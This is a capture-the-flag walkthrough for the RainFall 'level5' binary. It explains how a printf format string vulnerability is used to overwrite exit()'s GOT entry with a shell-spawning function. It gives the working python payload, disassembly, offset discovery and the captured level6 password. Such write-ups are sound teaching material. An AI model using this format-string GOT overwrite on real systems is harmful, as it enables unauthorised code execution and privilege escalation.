# Walkthrough

## Solution

```
(python -c 'print ("\x38\x98\x04\x08" + "%134513824c" + "%4$n")'; cat -) | ./level5
pwd
/home/user/level5
whoami
level6
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

## Explanation

### Execution

```
level5@RainFall:~$ ./level5 
hello
hello
```
-> The program waits for an input, and then echo that output.  

### Disassembly

```
info variable
0x08049854  m

info function
0x080484a4  o
0x080484c2  n
0x08048504  main
```

You can view the commented asm code [here](Ressources/assembly.asm)  
You can view the asm code translated to C [here](source.c)  


### Steps

-> We know there is a function o() that launches a shell, but it is not called.  

The program takes an input through fgets, which is protected from buffer overflows.  
It then prints the buffer and exits.  
The exit function comes from the plt (*exit@plt*).  

The procedure linkage table (PLT) consists of many jump instructions, each one corresponding to
the address of a function.  

```
level5@RainFall:~$ objdump -d -j .plt ./level5 
...
080483d0 <exit@plt>:
 80483d0:	ff 25 38 98 04 08    	jmp    *0x8049838
 80483d6:	68 28 00 00 00       	push   $0x28
 80483db:	e9 90 ff ff ff       	jmp    8048370 <_init+0x3c>
...
```  

One of these jump instructions is associated with the exit() function, which is called at the end of the program.  
If the jump instruction used for the exit() function can be manipulated to direct the execution flow into shellcode instead of the exit() function, a root shell will be spawned.  

But the plt table is *read-only*.  
The jump instruction reveals that it isn't jumping to an address but to a pointer to address.  
For example, the actual address of the exit() function’s address is stored at 0x8049838.  

These addresses exist in another section, called the **global offset table** (GOT), which is writable.

```
level5@RainFall:~$ objdump -R ./level5 

./level5:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049814 R_386_GLOB_DAT    __gmon_start__
08049848 R_386_COPY        stdin
08049824 R_386_JUMP_SLOT   printf
08049828 R_386_JUMP_SLOT   _exit
0804982c R_386_JUMP_SLOT   fgets
08049830 R_386_JUMP_SLOT   system
08049834 R_386_JUMP_SLOT   __gmon_start__
08049838 R_386_JUMP_SLOT   exit
0804983c R_386_JUMP_SLOT   __libc_start_main
```  

This reveals that the address of the exit() function is located in the GOT at 0x08049838.  
If the address of the shellcode is over-written at this location, the program should call
the shellcode when it thinks it’s calling the exit() function.  

We can use the printf format string vulnerability to write the function o's address instead
of the exit function address when it is called in function n().  

- Let's find in which position does the m variable address starts.  

```
level5@RainFall:~$ ./level5 
AAAA %x %x %x %x %x %x %x
AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078
```
-> It is on the 4th position.

```
-> exit:	0x08049838
-> o: 		0x080484a4 == 134513828 in decimal - 4bytes (for the exit address)
```
We have to print enough characters to reach the number that is the address of o.  

- Let's overwrite exit by o:  
```
(python -c 'print ("\x38\x98\x04\x08" + "%134513824c" + "%4$n")'; cat -) | ./level5
pwd
/home/user/level5
whoami
level6
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
